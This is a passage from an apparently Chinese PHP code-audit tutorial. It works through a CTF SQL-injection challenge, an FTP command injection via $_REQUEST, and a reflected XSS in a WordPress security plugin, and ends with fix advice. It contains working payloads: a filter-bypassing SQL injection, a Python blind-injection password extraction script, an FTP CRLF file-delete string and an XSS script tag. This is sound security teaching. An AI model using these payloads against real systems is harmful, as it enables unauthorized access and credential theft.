class="string">&quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;<span class="subst">&#123;$query&#125;</span>&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Welcome <span class="subst">&#123;$row[&#x27;user&#x27;]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select pwd from users where user=&#x27;admin&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="variable">$admin_pass</span> = <span class="variable">$row</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$admin_pass</span>)&amp;&amp;(<span class="variable">$admin_pass</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这道题主要还是绕过防护成功进行sql注入,我们可以看到 第25-26行 ，只要我们知道 Admin 用户的密码，就能拿到flag。在 第11行 处 $_GET[user] 和 $_GET[pwd] 两个变量可控，存在SQL注入。再看 第6-7行 ，当中过滤了 # 、 - 号，那么我们就无法进行常规的注释，但是我们可以用 ;%00 来进行注释。 $black_list 还过滤了很多字符串截取函数，这里我们可使用 regexp 来解决。最终我们的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/?user=\&amp;pwd=||1;%00</span><br><span class="line">对应SQL语句为：</span><br><span class="line">select user from users where user=&#x27;\&#x27; and pwd=&#x27;||1;&#x27;</span><br><span class="line">等价于：</span><br><span class="line">select user from users where user=&#x27;xxxxxxxxxxx&#x27;||1#</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">char_set = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_&#x27;</span></span><br><span class="line">pw = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> char_set:</span><br><span class="line">        url = <span class="string">&#x27;http://localhost/CTF/?user=\\&amp;pwd=||pwd/**/regexp/**/&quot;^%s&quot;;%%00&#x27;</span></span><br><span class="line">        r = requests.get(url=url%(pw+ch))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome Admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            pw += ch</span><br><span class="line">            <span class="built_in">print</span>(pw)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&#x27;_&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://localhost/CTF/?user=&amp;pwd=%s&#x27;</span> % pw)</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">&#x27;HRCTF&#123;\S&#123;1,50&#125;&#125;&#x27;</span>,r.text)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>REGEXP 是MySQL中的正则表达式匹配操作符，它检查pwd字段是否匹配指定的正则表达式。<br>如果pwd字段以猜测的密码字符开头，那么正则表达式匹配成功，SQL查询将返回结果。<br>由于这是一个布尔盲注攻击，攻击者无法直接看到查询结果，而是通过服务器的响应来判断正则表达式是否匹配成功。</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/penetration/360webscan-bypass.html">360webscan防注入脚本全面绕过</a> </p>
<h2 id="Day-16-Poem"><a href="#Day-16-Poem" class="headerlink" title="Day 16 - Poem"></a>Day 16 - Poem</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sock</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sock = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="variable">$port</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$user</span>, <span class="variable">$pass</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanInput</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">mode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;mode&#x27;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$_GET</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;intval&#x27;</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="variable">$_POST</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;intval&#x27;</span>, <span class="variable">$_POST</span>);</span><br><span class="line">        <span class="variable">$_COOKIE</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;intval&#x27;</span>, <span class="variable">$_COOKIE</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;sock, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;sock, <span class="variable">$username</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;sock, <span class="variable">$password</span> .<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span>(<span class="params"><span class="variable">$mode</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mode</span> == <span class="number">1</span> || <span class="variable">$mode</span> == <span class="number">2</span> || <span class="variable">$mode</span> == <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;sock, <span class="string">&quot;MODE<span class="subst">$mode</span>\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;sock, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FTP</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">21</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>漏洞解析</strong> ：</p>
<p>这道题目包含了两个漏洞，利用这两个漏洞，我们可以往FTP连接资源中注入恶意数据，执行FTP命令。首先看到 <strong>第7行</strong> 代码，可以发现程序使用 <strong>cleanInput</strong> 方法过滤 <strong>GET</strong> 、 <strong>POST</strong> 、 <strong>COOKIE</strong> 数据，将他们强制转成整型数据。然而在 <strong>第8行</strong> 处，却传入了一个从 <strong>REQUEST</strong> 方式获取的 <strong>mode</strong> 变量。我们都知道超全局数组 <strong>$_REQUEST</strong> 中的数据，是 <strong>$_GET</strong> 、 <strong>$_POST</strong> 、 <strong>$_COOKIE</strong> 的合集，而且数据是复制过去的，并不是引用。我们先来看一个例子，来验证这一观点：</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-3.png"></p>
<p>可以发现 <strong>REQUEST</strong> 数据丝毫不受过滤函数的影响。回到本例题，例题中的程序过滤函数只对 <strong>GET</strong> 、 <strong>POST</strong> 、 <strong>COOKIE</strong> 数据进行操作，最后拿来用的却是 <strong>REQUEST</strong> 数据，这显然会存在安全隐患。想了解更多 <a target="_blank" rel="noopener" href="http://www.php.net/manual/zh/reserved.variables.request.php"><strong>$_REQUEST</strong></a> 信息，大家自己上官网学习。第二个漏洞的话，在代码 <strong>第21行</strong> ，这里用了 <strong>&#x3D;&#x3D;</strong> 弱比较。关于这个问题，我们在前面的文章中讲的也很细致了，大家可以参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2491#toc-4">[红日安全]PHP-Audit-Labs题解之Day1-4</a> （Day4）。</p>
<p>至于本次案例的攻击payload，可以使用： <strong>?mode&#x3D;1%0a%0dDELETE%20test.file</strong> ，这个即可达到删除FTP服务器文件的效果。</p>
<h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们分析的是 <strong>WordPress</strong> 的 <a target="_blank" rel="noopener" href="https://cn.wordpress.org/plugins/all-in-one-wp-security-and-firewall/">All In One WP Security &amp; Firewall</a> 插件。该插件在 <strong>4.1.4 - 4.1.9</strong> 版本中存在反射型XSS漏洞，漏洞原因和本次案例中的漏洞成因一致，官方也在 <strong>4.2.0</strong> 版本中修复了该漏洞。本次，我们将以 <strong>4.1.4</strong> 版本插件作为案例讲解。<br>将下载下来的插件zip包，通过后台插件管理上传压缩包安装即可。本次发生问题的文件在于 <strong>wp-content\plugins\all-in-one-wp-security-and-firewall\admin\wp-security-dashboard-menu.php</strong> ，为了方便大家理解，我将问题代码抽取出来，简化如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AIOWPSecurity_Dashboard_Menu</span> <span class="keyword">extends</span> <span class="title">AIOWPSecurity_Admin_Menu</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$menu_tabs_handler</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;tab1&#x27;</span> =&gt; <span class="string">&#x27;render_tab1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab2&#x27;</span> =&gt; <span class="string">&#x27;render_tab2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab3&#x27;</span> =&gt; <span class="string">&#x27;render_tab3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab4&#x27;</span> =&gt; <span class="string">&#x27;render_tab4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tab5&#x27;</span> =&gt; <span class="string">&#x27;render_tab5&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render_menu_page</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">render_menu_page</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set_menu_tabs</span>();</span><br><span class="line">        <span class="variable">$tab</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_current_tab</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render_menu_tabs</span>();</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(&amp;<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;menu_tabs_handler[<span class="variable">$tab</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">render_tab3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;tab&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;tab&quot; value=&quot;&#x27;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;tab&quot;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以很清晰的看到，问题就出在 <strong>第25行</strong> 的 <strong>render_tab3</strong> 方法中，这里直接将 <strong>REQUEST</strong> 方式获取的 <strong>tab</strong> 变量拼接并输出。而实际上，在 <strong>第20行</strong> 已经获取了经过过滤处理的 <strong>$tab</strong> 变量。我们来看一下 <strong>get_current_tab</strong> 方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_current_tab</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$tab_keys</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;menu_tabs);</span><br><span class="line">    <span class="variable">$tab</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tab&#x27;</span>]) ? <span class="title function_ invoke__">sanitize_text_field</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tab&#x27;</span>]) : <span class="variable">$tab_keys</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$tab</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤函数的调用链如下图 <strong>第1行</strong> ，接着 <strong>$tab</strong> 变量就会经过 <strong>wp_check_invalid_utf8</strong> 方法的检测。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_check_invalid_utf8</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$strip</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = (<span class="keyword">string</span>)<span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> === <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Store the site charset as a static to avoid multiple calls to get_option()</span></span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$is_utf8</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$is_utf8</span>)) &#123;</span><br><span class="line">        <span class="variable">$is_utf8</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">get_option</span>(<span class="string">&#x27;blog_charset&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;utf8&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;UTF8&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$is_utf8</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for support for utf8 in the installed PCRE library once and store the result in a static</span></span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$utf8_pcre</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$utf8_pcre</span>)) &#123;</span><br><span class="line">        <span class="variable">$utf8_pcre</span> = @<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^./u&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// We can&#x27;t demand utf8 in the PCRE installation, so just return the string in those cases</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$utf8_pcre</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// preg_match fails when it encounters invalid UTF8 in $string</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> === @<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^./us&#x27;</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Attempt to strip the bad chars if requested(not recommended)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$strip</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;iconv&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下面我们来看看攻击 <strong>payload</strong> （向 <a target="_blank" rel="noopener" href="http://website/wp-admin/admin.php?page=aiowpsec&tab=tab3">http://website/wp-admin/admin.php?page=aiowpsec&amp;tab=tab3</a> POST数据 <code>tab=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ）：</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-4.png"></p>
<p>可以看到成功引发XSS攻击。我们最后再根据 <strong>payload</strong> 对代码的调用过程进行分析。首先，我们的 <strong>payload</strong> 会传入 <strong>wp-admin&#x2F;admin.php</strong> 文件中，最后进入 <strong>第14行</strong> 的 <strong>do_action(‘toplevel_page_aiowpsec’);</strong> 代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/admin.php</span></span><br><span class="line"><span class="variable">$page_hook</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$plugin_page</span> = <span class="title function_ invoke__">wp_unslash</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    <span class="variable">$plugin_page</span> = <span class="title function_ invoke__">plugin_basename</span>(<span class="variable">$plugin_page</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过get_plugin_page_hook函数处理，$page_hook=&#x27;toplevel_page_aiowpsec&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$plugin_page</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$page_hook</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">do_action</span>(<span class="variable">$page_hook</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <strong>wp-includes&#x2F;plugin.php</strong> 文件中，程序又调用了 <strong>WP_Hook</strong> 类的 <strong>do_action</strong> 方法，该方法调用了自身的 <strong>apply_filters</strong> 方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/plugin.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_action</span>(<span class="params"><span class="variable">$tag</span>, <span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$wp_filter</span>, <span class="variable">$wp_actions</span>, <span class="variable">$wp_current_filter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$wp_filter</span>[<span class="variable">$tag</span>]-&gt;<span class="title function_ invoke__">do_action</span>();</span><br><span class="line">    <span class="title function_ invoke__">array_pop</span>(<span class="variable">$wp_current_filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wp-includes/class-wp-hook.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">do_action</span>(<span class="params"><span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;doing_action = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$args</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;nesting_level) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;doing_action = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后 <strong>apply_filters</strong> 方法调用了 <strong>wp-content\plugins\all-in-one-wp-security-and-firewall\admin\wp-security-admin-init.php</strong> 文件的 <strong>handle_dashboard_menu_rendering</strong> 方法，并实例化了一个 <strong>AIOWPSecurity_Dashboard_Menu</strong> 对象。</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-5.png"></p>
<p>接下来就是开头文章分析的部分</p>
<p>整个漏洞的攻击链就如下图所示：</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-6.png"></p>
<p>这里还有一个小知识点要提醒大家的是，案例中 <strong>$_REQUEST[“tab”]</strong> 最后取到的是 <strong>$_POST[“tab”]</strong> 的值，而不是 <strong>$_GET[“tab”]</strong> 变量的值。这其实和 <strong>php.ini</strong> 中的 <strong>request_order</strong> 对应的值有关。例如在我的环境中， <strong>request_order</strong> 配置如下：</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-7.png"></p>
<p>这里的 <strong>“GP”</strong> 表示的是 <strong>GET</strong> 和 <strong>POST</strong> ，且顺序从左往右。例如我们同时以 <strong>GET</strong> 和 <strong>POST</strong> 方式传输 <strong>tab</strong> 变量，那么最终用 <strong>$_REQUEST[‘tab’]</strong> 获取到的就是 <strong>$_POST[‘tab’]</strong> 的值。更详细的介绍可以看如下PHP手册的定义：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request_order <span class="keyword">string</span></span><br><span class="line">This directive describes the order in which PHP registers GET, POST <span class="keyword">and</span> Cookie variables into the _REQUEST <span class="keyword">array</span>. Registration is done <span class="keyword">from</span> left to right, newer values override older values.</span><br><span class="line"></span><br><span class="line">If this directive is not set, variables_order is used <span class="keyword">for</span> <span class="variable">$_REQUEST</span> contents.</span><br><span class="line"></span><br><span class="line">Note that the <span class="keyword">default</span> distribution php.ini files does not contain the <span class="string">&#x27;C&#x27;</span> <span class="keyword">for</span> cookies, due to security concerns.</span><br></pre></td></tr></table></figure>

<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>对于这个漏洞的修复方案，我们只要使用过滤后的 <strong>$tab</strong> 变量即可，且变量最好经过HTML实体编码后再输出，例如使用 <strong>htmlentities</strong> 函数等。</p>
